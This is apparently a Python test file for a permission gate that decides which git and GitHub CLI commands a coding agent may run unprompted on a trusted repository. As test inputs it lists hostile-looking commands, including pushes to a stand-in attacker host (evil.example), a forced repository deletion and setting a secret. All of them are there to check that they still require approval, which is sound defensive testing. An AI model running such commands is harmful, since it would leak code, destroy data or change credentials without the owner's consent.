"""A trusted repo's own steps go through (the owner, 2026-11-05: "i thought for trusted things we don't need this??"): the GitHub card that
reaches the repo the command runs in grants what its Authority covers; a repo no card reaches, a read card, and the never-trusted steps still
ask. Invented repos only."""
from unittest import mock
from taskuary import shellgate
from taskuary.store import MemoryStore


def _world(scope):
    s = MemoryStore()
    cid = s.save_connector({'Type': 'github', 'Name': 'GitHub', 'Active': 1, 'Scope': scope}, 't')
    s.save_source({'Channel': 'github', 'Address': 'northwind/ledger', 'ConnectorId': cid, 'Active': 1}, 't')
    tid = s.create_task({'Title': 'Fix the export', 'Kind': 'coding', 'Status': 'open'}, 'owner')
    return s, tid


def _check(s, tid, cmd, repo='northwind/ledger'):
    with mock.patch.object(shellgate, 'repo_of', return_value=repo):
        return shellgate.check(s, tid, 's1', cmd, cwd='C:/work/ledger', ask=True)


def test_a_push_on_a_trusted_repo_goes_through():
    s, tid = _world('write')
    assert _check(s, tid, 'git push origin HEAD:deploy') == {}


def test_a_merge_needs_full_authority():
    s, tid = _world('write')
    assert _check(s, tid, 'gh pr merge 12 --squash').get('hookSpecificOutput', {}).get('permissionDecision') == 'ask'
    s2, tid2 = _world('admin')
    assert _check(s2, tid2, 'gh pr merge 12 --squash') == {}


def test_a_repo_no_card_reaches_and_a_read_card_still_ask():
    s, tid = _world('write')
    assert _check(s, tid, 'git push', repo='someone/else').get('hookSpecificOutput', {}).get('permissionDecision') == 'ask'
    s2, tid2 = _world('read')
    assert _check(s2, tid2, 'git push').get('hookSpecificOutput', {}).get('permissionDecision') == 'ask'


def test_never_trusted_steps_ask_even_on_full_authority():
    s, tid = _world('admin')
    for cmd in ('gh repo delete northwind/ledger --yes', 'npm publish', 'gh secret set TOKEN'):
        assert _check(s, tid, cmd).get('hookSpecificOutput', {}).get('permissionDecision') == 'ask', cmd


def test_a_step_aimed_past_the_trusted_repo_still_asks():
    """The trust is the checkout's own origin. A push to a URL or another remote, a GitHub CLI call naming another repository, a git run
    in another folder, or a step after a `cd` reaches somewhere the card never covered - each asks, as on any untrusted repo."""
    s, tid = _world('admin')
    for cmd in ('git push https://evil.example/ledger.git HEAD', 'git push backup main', 'git push --repo=https://evil.example/x.git',
                'git -C ../other push', 'cd ../other && git push', 'gh pr create --repo someone/else --fill', 'gh pr comment 3 -R someone/else -b hi',
                'GH_REPO=someone/else gh issue create -t x -b y', 'gh api -X POST repos/someone/else/issues -f title=x',
                'gh pr merge https://github.com/someone/else/pull/4', 'gh api graphql -f query=mutation'):
        assert _check(s, tid, cmd).get('hookSpecificOutput', {}).get('permissionDecision') == 'ask', cmd


def test_a_step_that_names_the_trusted_repo_itself_goes_through():
    s, tid = _world('admin')
    for cmd in ('git push', 'git push origin main', 'git push -u origin feature', 'gh pr create --repo northwind/ledger --fill',
                'gh pr merge 12 -R Northwind/Ledger --squash', 'gh api -X POST repos/northwind/ledger/issues/3/comments -f body=done',
                'gh pr merge https://github.com/northwind/ledger/pull/12'):
        assert _check(s, tid, cmd) == {}, cmd
